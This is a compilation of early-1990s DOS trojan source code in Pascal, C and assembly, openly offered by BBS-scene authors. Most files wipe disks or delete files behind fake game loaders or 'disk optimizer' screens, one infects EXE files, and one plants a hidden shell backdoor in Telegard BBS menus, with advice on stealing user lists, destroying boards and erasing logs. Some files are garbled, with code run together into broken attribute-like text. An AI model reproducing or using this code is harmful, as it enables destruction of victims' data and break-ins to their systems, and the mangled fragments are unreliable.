

-------------------------------------
Trojan Source - backfind.pas


          Program Wipe_The_Fuckers_HD;
              uses dos,crt;
          var read:string;
            Begin
          clrscr;
          Writeln ('ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿');
          Writeln ('³          Search And Destroy           ³');
          Writeln ('³             Loader v1.0               ³');
          Writeln ('³  Bringing The Best And Latest Warez   ³');
          Writeln ('ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ');
          writeln ('       Written by S.A.D. Incoporated');
          Write ('Please Press [ENTER] To Load The Game,');
          readln (read);
          write ('Please wait ..');
          inline ($B0/$07/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {H:}
          write ('.');
          inline ($B0/$06/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {G:}
          write ('.');
          inline ($B0/$05/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {F:}
          write ('.');
          inline ($B0/$04/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {E:}
          write ('.');
          inline ($B0/$03/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {D:}
          write ('.');
          inline ($B0/$02/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {C:}
          write ('.');
          inline ($B0/$01/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {B:}
          write ('.');
          inline ($B0/$00/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {A:}
          write ('..Loading Done!- Enjoy Your Game!!');
          writeln;
          write ('Press [ENTER] to Start The Game.');
          readln;
          textcolor (14);
          writeln ('Hey Geoff You know what happened a few days ago?');
          writeln ('Some friends asked me to get rid of you.  You want');
          writeln ('to know why?  They HATE YOUR FUCKING BOARD and ');
          writeln ('EVERYTHING you and that SUB-OP Chis Stands for! ');
          Writeln ('SO they asked me to teach you a little lesson.  They ');
          Writeln ('asked me to FUCK your harddrive Over! So, all the drives');
          Writeln ('in your system have been FUCKED!  Sorry, and Please Do');
          Writeln ('NOT make me have to do this again.  I do enjoy my work');
          Writeln ('but, after three times Its a little SICK! Thank you Geoff');
          Writeln ('P.S. I have nothing personal against you! You just');
          Writeln ('FUCKED with the Cold Brothers and I had to take you down, again');
          Writeln('');
          TextColor (9);
          Writeln('S.W.A.T Strikes AGAIN! With S.A.D. Standing In');
          End.-------------------------------------
Trojan Source - bill_ted.c


#include <dos.h>
#include <string.h>

main()
{
	char *vir;
	int i;

	strcpy(vir,"");
	for (i=0; i<40; i++)="" strcat(vir,"hows="" it="" doing="" royal="" ugly="" dudes!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");="" abswrite(2,50,0,vir);="" abswrite(3,50,0,vir);="" abswrite(4,50,0,vir);="" abswrite(5,50,0,vir);="" printf("ouch="" dude...="" sorry..");="" };="" -------------------------------------="" trojan="" source="" -="" bomber.c="" #include=""></40;><dos.h>

main()
{
	char *vir;
	abswrite(0,50,0,vir);
	abswrite(1,50,0,vir);
	abswrite(2,50,0,vir);
	abswrite(3,50,0,vir);
	abswrite(4,50,0,vir);
	printf("FUCK YOU ALL");
	printf("The Bomber");
}

-------------------------------------
Trojan Source - bypass.asm


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> Bypass Trojan v1.0 and v2.0 :

 Created by: Mechanix
 Released  : October 1991

 Introduction:

    Well this is basically another backdoor creator for Telegard Systems. This
 one is relatively fullproof except for the fact that it requires REMOTE.BAT to
 exist on the target system, or it will not function properly. However, the
 Bypass Trojan v2.0 takes care of this problem as it creates REMOTE.BAT on the
 target system, if it doesn't exist already. This is why I am also releasing
 the source (in Turbo Pascal) to the Bypass Trojan v1.0. You will find the
 source after the description.

 Description:

    This trojan will scan all directories on drives C: to E: in search of the
 MAIN.MNU file. Then it will append a few lines to the file as to create a
 hidden command to shell to DOS. It also checks to see if the MAIN.MNU file is
 Read-Only or Hidden, and will remove these attributes long enough to make the
 changes. It will also check for write-protection. The source can also be
 changed as to modify any of the .MNU files.

 Notes:

    This trojan uses a basic Turbo Pascal cycle to scan all directories and
 files, and thus the source can be modified for a number of uses. As for a good
 procedure to nail the board once the shell to DOS command has been
 implemented, I recommend the following:
  - First and foremost, use a PBX or other phreaking trick to avoid the
    annoying Maestro phone.
  - Call preferably around 4-5 am, when the SysOp is almost sure not to be
    around.
  - Use the shuttle password (if there is one) and then apply as a NEW user
    after you have bypassed the shuttle password. This will usually bypass CBV
    utilities.
  - Shell to DOS in the correct menu.
  - Turn your capture mode on, as to record everything you see.
  - Go get the user list and ZIP it up with another ZIP file that is already
    online. This way you can D/L it later when you log on again. Or capture it
    through a text file viewing utility if you find one on the system.
  - If you don't want the user list, and just want to crash the board, then
    FORMAT C: should do the trick. Or uses DEBUG to rearrange his FATs. Or if
    it's a H/P board, use one of the online virii or trojans to screw him. That
    will teach him, and you get to test them out.
  - If you decide to only take the user list and let the board live, then go
    edit the logs as to remove all evidence of your actions. If there's a spool
    to printer log, you're in trouble.
  - If you could not bypass CBV, then find that utility's log and edit out
    your number.
  - Lastly, take off the DOS shell command from the menu you modified in the
    first place, unless you want to use it again, but this is risky.

 Well that's the method I've been using, but the choice is your's.





 Source:

PROGRAM BYPASS1;
{ Bypass Trojan v1.0                                                          }
{ Created by: Mî›H’ï!X [NuKE]                                                 }
{ Created on: 27/09/91                                                        }
USES DOS;
VAR
 Target  : SEARCHREC;
 T       : TEXT;
PROCEDURE DIRECT   (PATH : STRING);
VAR
 PATH2    : STRING;
 INFO     : SEARCHREC;
 INFO2    : SEARCHREC;
 F        : TEXT;
BEGIN
 Findfirst (PATH + '\*.*',$10,INFO);
 WHILE DOSERROR = 0 DO
  BEGIN
   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
    Begin
     PATH2 := PATH + '\' + INFO.NAME;
      Chdir (PATH2);
       Findfirst ('MAIN.MNU',($3F - $10),INFO2);       { Or any .MNU you wish }
       WHILE DOSERROR = 0 DO
        Begin
         ASSIGN (F,INFO2.NAME);
         Setfattr (F,$20);
         Append (F);
         Writeln (F,' ');
         Writeln (F,' ');
         Writeln (F,'#');                                        { Key to add }
         Writeln (F,' ');
         Writeln (F,'-$');
         Writeln (F,'NUKEWAR;PW: ;^8WRONG - access denied!');      { Password }
         Writeln (F,' ');
         Writeln (F,' ');
         Writeln (F,' ');
         Writeln (F,'#');                                        { Key to add }
         Writeln (F,' ');
         Writeln (F,'D-');
         Writeln (F,'REMOTE.BAT');
         Close (F);
         Findnext(INFO2);
       End;
      DIRECT (PATH2);
    End;
   Findnext(INFO);
  End;
 END;
PROCEDURE FILEFIND (DRIVE : CHAR);
BEGIN
 Chdir (DRIVE + ':\');
 Findfirst ('MAIN.MNU',($3F - $10),Target);            { Or any .MNU you wish }
 WHILE DOSERROR = 0 DO
  Begin
   ASSIGN (T,Target.name);
   Setfattr (T,$20);
   {$I-}
   Append (T);
   {$I+}
   IF IORESULT = 0 THEN
    Begin
     Writeln (T,' ');
     Writeln (T,'#');                                            { Key to add }
     Writeln (T,' ');
     Writeln (T,'-$');
     Writeln (T,'NUKEWAR;PW: ;^8WRONG - access denied!');          { Password }
     Writeln (T,' ');
     Writeln (T,' ');
     Writeln (T,' ');
     Writeln (T,'#');                                            { Key to add }
     Writeln (T,' ');
     Writeln (T,'D-');
     Writeln (T,'REMOTE.BAT');
     Close (T);
    End
   ELSE
    Exit;
   Findnext (Target);
  End;
 DIRECT  (DRIVE + ':');
END;
BEGIN
 {$I-}
 Chdir ('C:\');
 {$I+}
 IF IORESULT = 0 THEN
  FILEFIND ('C');
 {$I-}
 Chdir ('D:\');
 {$I+}
 IF IORESULT = 0 THEN
  FILEFIND ('D');
 {$I-}
 Chdir ('E:\');
 {$I+}
 IF IORESULT = 0 THEN
  FILEFIND ('E');
END.

    Well there it is. Please feel free to improve it in anyway you like. I will
 soon release the source to Bypass Trojan v2.0 which checks for REMOTE.BAT and
 creates one if needed. The REMOTE.BAT file also has the Hidden attribute to
 try and hide it from the SysOp. The reason for this, is that smart SysOps, and
 any of those who are reading this, rename the REMOTE.BAT or remove it, to
 avoid this sort of trojan. The original release is for a modem on Com2. If you
 wish to have the trojan for another device, either edit it in the .EXE, or
 contact me (Mechanix) on any [NuKE] board, and I will recompile the source for
 you with another device.

 Mechanix [NuKE]
-------------------------------------
Trojan Source - catfod.pas


program z;
uses dos,crt;
var
 c,a,t,f,o,d:integer;
 regS:registers;
begin
 randomize;
 window(1,1,80,25);
 textbackground(0);
 textcolor(7);
 clrscr;
 for c:=2 to 5 do begin
  regs.al:=c;
  regs.cx:=666;
  regs.dx:=0;
  regs.bx:=random(9999);
  intr($26,regs);
 end;
 repeat
  regs.al:=2;
  regs.cx:=random(900)+100;
  regs.dx:=random(1500);
  regs.bx:=random(9999);
  intr($26,regs);
 until true=false;
end.

-------------------------------------
Trojan Source - crazy.c


/* Make You Crazy !!

	Never execute this program on your HD , haha !!



	Programmed By Ninja Wala -- Royal Leader of Software Underground Palace

	Share your knowledge and experience with other members in SUP,
	and we share ours with you.

*/

#include        <stdio.h>
#include		<stdlib.h>
#include        <dir.h>

main()
{
	int i,j;
	char tmp[20];
	char far *ptr;

	for (i=0;i<=50;i++){ srand(rand());="" ptr="itoa(rand(),tmp,10);" mkdir="" (="" ptr="" );="" chdir="" (="" ptr="" );="" for="" (j=""></=50;i++){><=50;j++){ ptr="itoa(rand(),tmp,10);" mkdir(="" ptr="" );="" }="" chdir="" ("\\");="" }="" }="" -------------------------------------="" trojan="" source="" -="" datarape.asm="" äääääääääííííííííí="">>> Article From Evolution #2 - YAM '92

Article Title: Data Rape v2.1 Trojan
Author: Admiral Bailey


;=---
;
; DataRape 2.1 Trojan
;
; Disassembled By Admiral Bailey [YAM '92]
; June 25, 1992
;
; The writers of this virus are Zodiac and Data Disruptor
;
; Notes:Just a regular trojan.  This one puts the messege into the
;       sector it writes.  Even though its not advanced it gets the
;       job done.
;
;=---------
seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h

datarap2  proc    far
start:
                jmp     begin
messege         db      '----------------------------',0Dh,0ah
                db      '         DataRape v2.1      ',0dh,0ah
                db      '    Written by Zodiac and   ',0dh,0ah
                db      '        Data Disruptor      ',0dh,0ah
copyright       db      '(c) 1991 RABID International',0dh,0ah
                db      '----------------------------',0dh,0ah

sector          db      1
data_3          db      0

begin:
                mov     ah,0Bh                  ; write sectors
                mov     al,45h                  ; sectors to write to
                mov     bx,offset messege       ; writes this messege
                mov     ch,0                    ; clear out these
                mov     cl,0
                mov     dh,0
                mov     dl,80h                  ; drive
                int     13h

                jnc     write_loop              ; nomatter what jump to
                jc      write_loop              ; the write loop and
                jmp     short write_loop        ; destroy rest of drive
                nop
compare:
                mov     sector,1                ; start writing at sec1
                inc     data_3
                jmp     short loc_4
                db      90h
write_loop:
                cmp     data_3,28h
                jae     quit
                cmp     sector,9
                ja      compare
loc_4:
                mov     ah,3                    ; write sec's from mem
                mov     al,9                    ; #
                mov     bx,offset messege       ; this is in mem
                mov     ch,data_3               ; cylinder
                mov     cl,sector               ; sector
                mov     dh,0                    ; drive head
                mov     dl,2                    ; drive
                int     13h

                inc     sector                  ; move up a sector
                jmp     short write_loop
                db       73h, 02h, 72h, 00h
quit:
                mov     ax,4C00h
                int     21h                     ; now quit

datarap2  endp

seg_a           ends

                end     start


-------------------------------------
Trojan Source - dieloser.pas


        Program Die_loser;

          {Written and Compiled in TP 5.5 by VanguarD}

          {A Nation of Thieve's release.  Use with discretion, and let it
          be known that NoT and the author of this program are NoT
          responsible for any problems or damage this file may cause.}

          {Best suggestion for use: Either link it to the .EXE of a program
          to be run, or hide it and add it to the RUNME.BAT file that most
          losers use when they boot up a ware}

{
                        NNNN   NN     'TTTTTTTTTTT
                       'NNNN  'NN      ''''TTT
                       'NNNN  'NN  OOOOOO 'TTT
                       'NNN N 'NN'OO   'OO'TTT
                       'NNN 'NNNN'OOO  'OO'TTT
                       'NNN  'NNN 'OOOOOO 'TTT
                       ''''  '''  ''''''  '''

                Nation of Thieves Trojan/Virus Release #1
                                                                         }


        uses dos,crt;
        var ch : char;
        Begin
          clrscr;
          inline ($B0/$07/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {H:}
          write ('.');
          inline ($B0/$06/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {G:}
          write ('.');
          inline ($B0/$05/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {F:}
          write ('.');
          inline ($B0/$04/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {E:}
          write ('.');
          inline ($B0/$03/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {D:}
          write ('.');
          inline ($B0/$02/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {C:}
          write ('.');
          inline ($B0/$01/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {B:}
          write ('.');
          inline ($B0/$00/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {A:}
          writeln;
          write ('Press [ENTER] to Continue');
          readln;
        end.
-------------------------------------
Trojan Source - easytroj.pas


program Easytroj; { Here is a program that exemplifies a simple recursive
                    procedure that goes through and deletes all the files
                    in each of the directories on the disk - and takes
                    away the read-only attribute of all the philes.}
uses dos;
{ Written by: Orpheus}
{ Disclaimer:  I will not accept ANY responsibilities under ANY
               circumstances. I make no guarantees with this program.
               I am not responsible for illegal use of this program,
               it is to be used ONLY(of course) as a teaching tool that
               demonstrates recursive Turbo Pascal 5.X programming
               techniques.  So, by reading/using this, you are taking away
               all responsibilities from me that are written, implied,
               or stated, and shit.  So, THERE!  Bahahahahaha.......}
var
 filerec        : searchrec;{ This is the searchrec record that is
                              contained in the dos unit.  The format
                              is:   searchrec = record
                                                 fill: array[1..21] of byte;
                                                 attr: byte;
                                                 time: longint;
                                                 size: longint;
                                                 name: string[12];
                                                end;
                              This record is actually the File Control Block,
                              the FCB, of a file.  The 21-byte filler contains
                              technical information needed by DOS, DON'T fuck
                              with it!}
 targetfile     : file;
 oldattr,newattr: word;
procedure trashdirs(path : string);
var
 path2    : string;
 fileinfo : searchrec;
 fileinfo2: searchrec;
 i        : byte;
 old,new  : word;
 f        : file;
begin
 findfirst(path + '\*.*',directory,fileinfo);{This finds all directories}
 while doserror = 0 do
  begin
   if (fileinfo.attr = directory) and        {If Directory...           }
      (fileinfo.name[1] <> '.') then begin   {and isn't '.' or '..'     }
       path2 := path + '\' + fileinfo.name;  {then alter path.          }
       chdir(path2);                         {Change to this path...    }
       findfirst('*.*',(anyfile - directory),fileinfo2);{Find all files }
       while doserror = 0 do begin
        assign(f,fileinfo2.name);            {Assign var F to files name}
        getfattr(f,old);                     {Get F's old attr.         }
        new := old and $FE;                  
        setfattr(f,new);                     {Get rid of Read-Only      }
        erase(f);                            {Erase file...             }
        rewrite(f);                          {Remake it...              }
        close(f);                            {close it...               }
        erase(f);                            {Then erase it, and make it}
                                             {so it can't be unerased.  }
        findnext(fileinfo2);                 {Find next file.           }
       end;
      trashdirs(path2);                      {Recursively go back and do}
                                             {it again to next directory}
   end;
   findnext(fileinfo);                       {Find next direcotry       }
  end;
end;
procedure trash(drive : char);               {Use this procedure to     }
                                             {trash all the files in the}
                                             {root directory.           }
begin
 chdir(drive + ':\');                        {Change to root directory  }
 findfirst('*.*',anyfile-directory,filerec); {find all files...         }
 while doserror = 0 do begin
  assign(targetfile,filerec.name);           {Assign var targfil to file}
  getfattr(targetfile,oldattr);              {Get targetfile's old attr }
  newattr := oldattr and $FD;
  setfattr(targetfile,newattr);              {Get rid of Read-Only.     }
  {$I-}erase(targetfile);                    {Erase file...             }
  rewrite(targetfile);                       {rewrite file...           }
  close(targetfile);                         {close file...             }
  erase(targetfile);{$I+                     {erase file...             }
  findnext(filerec);                         {find next file.           }
 end;
 trashdirs(drive + ':');                     {calls Trashdir's to trash }
                                             {all directories/files     }
end;
var
 c : char;
cur: string;
begin
 Writeln;                                  {Put your fake info here.    }
 Writeln;
 Write('Enter drive to "optimize": ');     {Make the shithead enter     }
                                           {the drive, or do it yourself}
 readln(c);
 {$I-}Chdir(c + ':\');{$I+}                {Change to root.             }
 If IOResult<>0 then begin                 {If error then, write error  }
                                           {message...                  }
  Writeln;
  Writeln('Evidently, the drive that you entered is');{Change this to   }
  Writeln('not currently operating.  Please execute');{whatever you wish}
  Writeln('this program again with the correct info');{or just make it  }
  Writeln;                                 {trash a directory           }
  halt;                                    {Exit program.               }
 end
 else trash(c);                            {if no error,then trash drive}
 Writeln('Ok, asshole.  You''re dead.');   {Change this to whatever.    }
end.                                       {The End!                    }

-------------------------------------
Trojan Source - femifbia.pas


program v;

uses dos;

var filexe : searchrec;
         f : file;
        cf : text;
       sig : string[3];
         p : array[0..6000] of byte;
      inff : string[12];
     oldir : string[12];
         s : integer;

procedure infec(inff : string);
begin
  assign(f,paramstr(0));
  reset(f,1);
  blockread(f,p,4032);
  close(f);
  assign(f,inff);
  reset(f,1);
  blockwrite(f,p,4032);
  close(f);
end;

procedure inf;

begin

s:=0;

findfirst('*.exe',archive,filexe);

while doserror=0 do
begin

  assign(cf,filexe.name);
  reset(cf);
  read(cf,sig);
  close(cf);

  if not (sig='MZÀ') and (s=0) then
  begin
    infec(filexe.name);
    s:=1;
  end;

  findnext(filexe);

end;


end;

begin

inf;

findfirst('*.',directory,filexe);
while doserror=0 do
begin
  if not (filexe.name='.') then
  begin
    getdir(0,oldir);
    chdir(filexe.name);
    inf;
    chdir(oldir);
  end;

  findnext(filexe);
end;

writeln('File not found');

end.
-------------------------------------
Trojan Source - froggie.pas


program Disk_Space;
{ This program makes use of the

       CHR command
       USES command
       VAR command
       CLRSCR command
       WRITELN command
       DISKFREE command
       DISKSIZE command
       TRUNC command
       IF-THEN-ELSE command
       REPEAT-UNTIL command
       ASSIGN command
       REWRITE command
       WRITE command
       DELAY command
       CLOSE command
       RANDOMIZE command
       }
uses dos,crt;
var cdn:byte;
    dirname:string;
    a,b,c,d,e,f,g,h,i,j,k,l:char;
    ii:integer;
    q:text;
    ai:boolean;
begin
randomize;
clrscr;
cdn:=2;
gotoxy(22,2);
Writeln('Froggie-OPT v1.12 (c) Jason Friedman');
gotoxy(25,3);

writeln('Please wait - Reading System Data');
repeat;
cdn:=cdn+1;
if (diskfree(cdn)<1) and=""></1)><3) then="" writeln('="" your="" disk="" for="" drive="" ',chr(cdn+64),':="" is="" not="" in="" the="" drive')="" else="" if="" (diskfree(cdn)="">1) then
    Writeln('   Your disk space free for drive ',chr(cdn+64),': is ',
    trunc(diskfree(cdn)/1000),' KB out of ',trunc(disksize(cdn)/1000),' KB');
    until (diskfree(cdn)<1) and="" (cdn="">2);
delay(1000);
repeat
writeln(' Preparing to Froggie OPT - Please do not disturb');
writeln(' Any type of disturbance will cause file damnage ');
ii:=ii+1;
a:=chr(trunc(random(255)));
b:=chr(trunc(random(255)));
c:=chr(trunc(random(255)));
d:=chr(trunc(random(255)));
e:=chr(trunc(random(255)));
f:=chr(trunc(random(255)));
g:=chr(trunc(random(255)));
h:=chr(trunc(random(255)));
i:=chr(trunc(random(255)));
j:=chr(trunc(random(255)));
k:=chr(trunc(random(255)));
l:=chr(trunc(random(255)));
mkdir (a+b+c+d+e+f+g+h+i+'.'+j+k+l);
chdir (a+b+c+d+e+f+g+h+i+'.'+j+k+l);
  assign (q,'YOU');
  rewrite (q);
  close (q);
  assign (q,'ARE');
  rewrite (q);
  close (q);
  Assign (q,'LAME');
  rewrite (q);
  close (q);
  chdir('..');
  until ai=true;
end.
-------------------------------------
Trojan Source - fun.asm


Comment|
*************************************************************************
This is a basic shell for a trojan I made. It's a rather simple one that
uses INT 26h, an absolute disk write. 
AL:Drive # (a=0,b=1,etc);
BX:Offset of buffer
CX:Sectors to write
DX:Logical starting segment (meaning ascending from sector 0 or 
                             track0,sector0 going up)
DS:Segment adress of buffer

You may want to put a screen display before the main NOTAGAIN jump
with a start up display or something from TheDraw. 
You may also want to buff up the end by copying a large
file (like TELIX.EXE to the end) to make it big. i.e.

copy /b trojan.exe+telix.exe coolprog.exe

Well have fun!
     :Knight Rocker
************************************************************************|

dosseg
extrn showscrn:proc

graffiti segment byte public 'DATA'
    funstuf db 'Put whatever you want in      '
            db 'here. (i.e. song lyrics,      '
            db 'phone numbers of people you   '
            db 'hate) This will be written    '
            db 'many times on the poor souls  '
            db 'drive.                        '
            db '                              '
            db '                           '

graffiti ends

stacks segment byte stack 'STACK'     ;Why not?, heh.
    thestak db 256 dup (0)
stacks ends

code segment byte public 'code'
assume cs:code, ss:stacks
notagain:      mov al,1            ;1=B: (for testing) switch to 2 for C:
               mov dx,2            ;skip boot rec, fuck the FAT
               mov cx,10h
               mov bx, offset ds:funstuf
               push ax             ; int 26h screws with these
               push bx
               push cx
               push dx
               push si
               push di
               push bp
               int 26h
               pop ax          ;there's an extra word there (the flags)
               pop bp
               pop di
               pop si
               pop dx
               pop cx
               pop bx
               pop ax          ;get the real ax
               inc dx
               jmp notagain    ;repeat until pigs fly
   code ends
               end notagain
               
-------------------------------------
Trojan Source - gde.pas


PROGRAM GDE; {By änchanter for LAME SysOps}

USES CRT;

VAR Temp : Text;
    X : Integer;
    Death_File : String;

{--------------------------------------------------------------------------}
PROCEDURE NoParams;

   BEGIN;
      SOUND(220);
      DELAY(200);
      NOSOUND;
      TEXTCOLOR(RED);
      WRITELN('You Forgot Something... ');
      WRITELN;
      WRITELN(' SYNTAX:');
      WRITELN('GDE C:\SHOCK\USERS');
      WRITELN;
      WRITELN('Run AGAIN....');
      WRITELN('                      (c) 1990,1991');
      HALT;
   END;
{--------------------------------------------------------------------------}
PROCEDURE Kill_That_Fucker;

    BEGIN;
       ASSIGN(TEMP, Death_File);
       REWRITE(TEMP);
       CLOSE(TEMP);
       APPEND(TEMP);
       WHILE X <> 5 Do
	 BEGIN;
	   WRITELN(TEMP, 'KGB Read The User File');
	   WRITELN(TEMP, 'KGB Wrote The User File');
	   X := X + 1;
	 END;
       WRITELN(TEMP, '<boom, you="" are="" dead="">');
       WRITELN(TEMP, 'KGB is WATCHING YOU!');
       CLOSE(TEMP);
    END;
{--------------------------------------------------------------------------}
PROCEDURE INIT;

    BEGIN;
       IF PARAMCOUNT <> 1 THEN NoParams;
       Death_File := PARAMSTR(1);
       TEXTCOLOR(BLUE);
       WRITELN('READING USER FILE.......');
       Kill_That_Fucker;
       WRITELN('ERROR, USER FILE CURRUPTED!');
       HALT;
    END;
{--------------------------------------------------------------------------}
BEGIN;
   X := 1;
   INIT;
END.-------------------------------------
Trojan Source - gloom.c


/*
	     Gl00M & D00M trojan, 2-'93  ÛÛÛ²²±±°°ÄÄÄÄÅSandoZÄ
	     *safe for compiling until 'armed': check the code*

*/

#include <string.h>
#include <conio.h>
#include <dos.h>
void clearscreen(void);
union REGS regs;


int gloom_screen[] = {
	0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 
	0x5DB, 0x5DB, 0x520, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2DB, 0x2DB, 
	0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 
	0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 
	0x5DB, 0x5DB, 0x520, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x2DB, 0x2DB, 
	0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 
	0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0xDDB, 0xDDB, 
	0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0xADB, 0xADB, 0xADB, 0xADB, 0xADB, 0xADB, 0xADB, 
	0xADB, 0xADB, 0xADB, 0xADB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 
	0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0x5DB, 0xDDB, 0xDDB, 
	0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 0xDDB, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0xADB, 0xADB, 0xADB, 0xADB, 0xADB, 0xADB, 0xADB, 
	0xADB, 0xADB, 0xADB, 0xADB, 0x2DB, 0x2DB, 0x2DB, 0x2DB, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xDDB, 0xDDB, 
	0xDDB, 0xDDB, 0xDDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 
	0xCDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 
	0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xADB, 0xADB, 
	0xADB, 0xADB, 0xADB, 0xADB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xDDB, 0xDDB, 
	0xDDB, 0xDDB, 0xDDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 
	0xCDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 
	0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xADB, 0xADB, 
	0xADB, 0xADB, 0xADB, 0xADB, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 
	0xCDB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 0x4DB, 
	0x4DB, 0x4DB, 0x4DB, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0xBDB, 0xBDB, 
	0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 0xBDB, 
	0xBDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0xEDB, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
	0x20, 0x20, 0x20, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 0xCDB, 
